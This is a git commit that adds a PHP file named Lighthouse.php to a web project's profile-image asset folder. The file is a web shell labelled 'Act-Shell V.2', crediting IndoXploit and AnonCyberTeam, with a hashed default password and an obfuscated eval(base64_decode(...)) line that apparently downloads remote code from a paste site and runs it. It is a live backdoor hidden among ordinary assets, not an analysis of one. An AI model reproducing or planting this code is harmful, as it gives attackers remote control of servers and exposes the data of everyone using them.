87ef6760b337ef13390bab020b8bd6a01ccac1a6
ShinyQ_11 <kurniadi_wijaya_25rpl@student.smktelkom-mlg.sch.id>
2020-07-22 12:12:42 +0700

    Initial Commit

---
+++ assets/image/profil/5dc57c5d3cec5_Lighthouse.php
@@ -0,0 +1,13 @@
+<?php
+/*----Special Thanks l0c4lh34rtz- IndoXploit----*/
+//////////////////////////////////////////////////
+///            Act-Shell V.2                  ///
+///              Code by FirewalL21           ///
+///           Default pass: jahanam     	  ///
+///				Version: Darknet 			  ///
+//////////////////////////////////////////////////
+//Untuk Kelengkapan Tools bisa lihat dibagian bawah :D Terimakasih untuk orang yang membantu dalam pembuatan shell ini . Tanpa kalian shell ini tidak akan jadi .:v Untuk Tools Shell ini sebagian Fungsionnya kita ambil dari shell yang sudah ada. Dan selebihnya itu hasil karya AnonCyberTeam sendiri :D Spesial Thanks [ Mr.TeanWap - AnonCyberTeam ] [ l0c4lh3artz - IndoXploit ] and [ Yuss - N45HT ]
+/*----------------------------------------------*/
+$auth_pass = "c78acfe89325e0af5dd437213ba25ebd"; // default: jahanam
+eval(base64_decode(("J\x475vbmFt\x5a\x53A\x39\x49\x47Z\x70bGVf\x5a\x32V\x30X2\x4evb\x6e\x52lbnR\x7aK\x43d\x6f\x64HR\x77c\x7a\x6fvL\x33\x42\x68\x633Rl\x59mluLmN\x76\x62S9\x79YX\x63\x76\x65\x56p6Qj\x5a\x49VUMnK\x54sN\x43m\x562\x59\x57w\x6f\x633Ry\x583\x4avdDE\x7aKGd6aW5mb\x47\x46\x30\x5aS\x68\x7a\x64\x48J\x66cm\x39\x30\x4d\x54M\x6f\x59mF\x7aZT\x59\x30X2RlY2\x39k\x5aS\x67\x6b\x62m9\x75YW\x31lK\x53\x6b\x70\x4bSk\x37\x44\x51o\x3d\n")));
+?>
